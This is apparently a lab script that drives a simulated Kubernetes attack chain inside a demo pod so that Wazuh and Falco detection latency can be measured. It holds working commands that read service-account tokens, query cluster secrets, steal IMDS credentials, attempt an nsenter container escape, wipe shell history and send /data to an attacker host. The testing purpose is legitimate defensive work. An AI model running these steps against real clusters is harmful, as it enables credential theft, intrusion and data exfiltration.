#!/usr/bin/env bash
# Drive the simulated attack chain against the demo pod and time each step, so
# phase 7 can measure detection latency. LAB ONLY — every action runs inside the
# demo pod in the isolated VPC, on synthetic data, egress limited to the
# attacker host.
#
#   attack/run-attack.sh                 detect-only run (expects alerts, exfil reaches attacker)
#   attack/run-attack.sh --mode enforce  prevent run (expects blocks, alerts still raised)
#
# Chain order (0,1,2,D,3,B,G,4): the pipeline/admission step 0 is covered by the
# smoke test; this script runs steps 1-4 plus scenarios D, B, G from inside the pod.
set -uo pipefail

MODE="detect"
[ "${1:-}" = "--mode" ] && MODE="${2:?}"
NS="demo"
REGION="${AWS_REGION:-ap-southeast-1}"
ROOT="$(git rev-parse --show-toplevel)"

POD="$(kubectl -n "$NS" get pod -l app.kubernetes.io/name=demo-app -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
[ -n "$POD" ] || { echo "demo-app pod not found; run 'make deploy' first" >&2; exit 1; }

ATTACKER_IP="$(terraform -chdir="$ROOT/infra/terraform" output -raw attacker_private_ip 2>/dev/null || true)"

ts() { date '+%H:%M:%S'; }
step() { printf '\n[%s] === %s ===\n' "$(ts)" "$*"; }
# Run a command inside the demo pod; never fail the whole chain on one step.
inpod() { kubectl -n "$NS" exec "$POD" -- sh -c "$1" 2>&1 | sed 's/^/    /' || true; }

echo "Target pod: $POD   mode: $MODE   attacker: ${ATTACKER_IP:-<unknown>}"
echo "Watch Wazuh: Threat Hunting > Events, filter rule.groups: cipherguard"

# --- Step 1: foothold (T1609) --- the exec itself is the detection.
step "Step 1 foothold: shell in container (Falco 100110, audit 100202)"
inpod 'echo "shell active as $(id -un) in $(hostname)"'

# --- Step 2: discovery (T1552.007, T1613) ---
step "Step 2 discovery: read tokens, hit the API (Falco 100112/100111, audit 100203)"
inpod 'ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | head -1; echo "---"; head -c 40 /var/run/secrets/eks.amazonaws.com/serviceaccount/token 2>/dev/null; echo; env | grep -i aws_role'
inpod 'python -c "import ssl,urllib.request as u; c=ssl._create_unverified_context(); print(u.urlopen(\"https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets\", context=c, timeout=5).status)" 2>&1 | tail -1'

# --- Scenario D: IMDS credential theft (T1552.005) ---
step "Scenario D: contact IMDS for node credentials (Falco 100113, CRITICAL)"
inpod 'python - <<PY 2>&1 | tail -1
import urllib.request as u
try:
    r=u.Request("http://169.254.169.254/latest/api/token", method="PUT", headers={"X-aws-ec2-metadata-token-ttl-seconds":"60"})
    print("IMDS token:", u.urlopen(r, timeout=3).read()[:16])
except Exception as e:
    print("IMDS blocked:", type(e).__name__)
PY'

# --- Step 3: escalation (T1078.004) --- pod IAM role used beyond its grant.
step "Step 3 escalation: use pod IAM role for denied AWS calls (CloudTrail 100300)"
inpod 'python -c "import boto3; boto3.client(\"s3\").list_buckets()" 2>&1 | tail -1'
inpod 'python -c "import boto3; boto3.client(\"iam\").list_users()" 2>&1 | tail -1'

# --- Scenario B: container escape (T1611) ---
step "Scenario B: escape tooling in container (Falco 100114, CRITICAL)"
inpod 'nsenter -t 1 -m -u -i -n sh -c id 2>&1 | tail -1; echo "(nsenter attempt)"'

# --- Scenario G: defense evasion (T1105, T1070) ---
step "Scenario G: run dropped binary from /tmp, wipe history (Falco 100115/100116)"
inpod 'cp /bin/true /tmp/x 2>/dev/null && /tmp/x && echo "ran /tmp/x"; : > /tmp/.sh_history && rm -f /tmp/.sh_history && echo "history wiped"'

# --- Step 4: exfiltration (T1005, T1041) ---
step "Step 4 exfiltration: read /data, encrypt, send to attacker (Falco 100119/100120, correlation 100130)"
if [ -z "$ATTACKER_IP" ]; then
  echo "    attacker IP unknown (no terraform output); skipping send."
else
  # Stage exfil.py, the lab public key and (if vendored) the cryptography wheels.
  kubectl -n "$NS" cp "$ROOT/attack/exfil.py" "$NS/$POD:/tmp/exfil.py" 2>/dev/null || true
  kubectl -n "$NS" exec "$POD" -- mkdir -p /tmp/keys 2>/dev/null || true
  kubectl -n "$NS" cp "$ROOT/attack/keys/lab_recipient_pub.pem" "$NS/$POD:/tmp/keys/lab_recipient_pub.pem" 2>/dev/null || true

  if ls "$ROOT"/attack/vendor/*.whl >/dev/null 2>&1; then
    kubectl -n "$NS" exec "$POD" -- mkdir -p /tmp/pydeps 2>/dev/null || true
    for whl in "$ROOT"/attack/vendor/*.whl; do
      kubectl -n "$NS" cp "$whl" "$NS/$POD:/tmp/pydeps/$(basename "$whl")" 2>/dev/null || true
    done
    inpod 'cd /tmp/pydeps && for w in *.whl; do python -c "import zipfile,sys; zipfile.ZipFile(\"$w\").extractall(\".\")"; done; echo "deps unpacked"'
    inpod "CIPHERGUARD_LAB=1 PYTHONPATH=/tmp/pydeps python /tmp/exfil.py --host $ATTACKER_IP --port 8080 --pubkey /tmp/keys/lab_recipient_pub.pem"
  else
    echo "    attack/vendor/ empty (run attack/vendor-deps.sh first)."
    echo "    Triggering the behaviour without encryption so Falco still fires:"
    inpod "cat /data/* >/tmp/stolen 2>/dev/null; python -c \"import urllib.request as u,os; d=open('/tmp/stolen','rb').read(); print('sent', u.urlopen(u.Request('http://$ATTACKER_IP:8080/exfil', data=d), timeout=5).status)\" 2>&1 | tail -1"
  fi
fi

echo
if [ "$MODE" = "enforce" ]; then
  echo "Prevent run: expect IMDS/API/egress blocked and the pod possibly isolated by Active Response."
  echo "Check:  kubectl -n $NS get pod $POD   (container may have been restarted)"
else
  echo "Detect-only run: expect Wazuh alerts for steps 1-4 within ~60s."
  echo "Attacker received data?  aws ssm start-session --target <attacker-id>  then ls /var/lib/receiver/"
fi
